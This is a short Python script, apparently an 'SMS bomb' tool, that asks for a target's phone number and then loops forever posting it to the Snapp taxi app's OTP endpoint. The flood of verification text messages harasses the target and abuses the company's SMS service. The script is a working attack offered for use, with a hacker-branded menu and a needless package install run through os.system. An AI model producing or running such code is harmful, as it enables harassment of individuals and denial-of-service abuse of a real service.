import requests
import os
red='\033[31m'
green='\033[32m'
yellow= '\033[33m'
blue = '\033[34m'
url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
os.system("clear")
os.system("apt install figlet -y")
os.system("clear")
print(f"{yellow}===========================================")
print(f"{red}   sms bomb abolfazl cyber hack @viroshac")
print(f"{green}===========================================")
print(f"{green} [1]"+ f"{red} start sms-bomb")
print(f"{green} [2]"+ f"{blue} exit")
print(f"{green} [3]"+ f"{yellow} help")
king = int(input(f"{red} [~]"+ f"{green}option cyberhack==>"))
if king == 1:
    hacker = input("Enter phone Number (shomareh bedoon sefr vared shavad (91+++++) : ")
    while True:
             requests.post(url,data={"cellphone":hacker})
             print("sended to =>", hacker)
elif king == 2:
    os.system("clear")
    print("target ba moafaghiat nabod shod :) =) ")
